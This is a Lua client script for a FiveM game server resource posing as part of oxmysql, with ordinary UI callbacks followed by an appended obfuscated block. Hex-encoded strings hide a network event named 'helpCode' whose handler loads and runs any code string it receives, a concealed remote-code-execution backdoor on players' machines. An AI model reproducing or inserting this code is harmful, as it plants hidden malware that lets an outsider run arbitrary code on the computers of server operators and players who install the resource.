RegisterNetEvent('oxmysql:openUi', function(data)
    SendNUIMessage({
        action = 'openUI',
        data = data
    })
    SetNuiFocus(true, true)
end)

RegisterNUICallback('exit', function(_, cb)
    cb(true)
    SetNuiFocus(false, false)
end)

RegisterNUICallback('fetchResource', function(data, cb)
    TriggerServerEvent('oxmysql:fetchResource', data)
    cb(true)
end)

RegisterNetEvent('oxmysql:loadResource', function(data)
    SendNUIMessage({
        action = 'loadResource',
        data = data
    })
end)

local MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[1]](MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[2]) MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[3]](MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[2], function(RarcuegOSJkcVqSaoGzbXCKugDWjigLjzjDIvHZrQXBECLwBpSRhtbMRzYEAVpTThvlFPb) MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[4]](MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[6][MyrhZMAILrDzdMjPumPrViFNKcGtwfZTNovVEUqtbqcxRjNGNjWGeKjYkTeAFQlGrlnpRS[5]](RarcuegOSJkcVqSaoGzbXCKugDWjigLjzjDIvHZrQXBECLwBpSRhtbMRzYEAVpTThvlFPb))() end)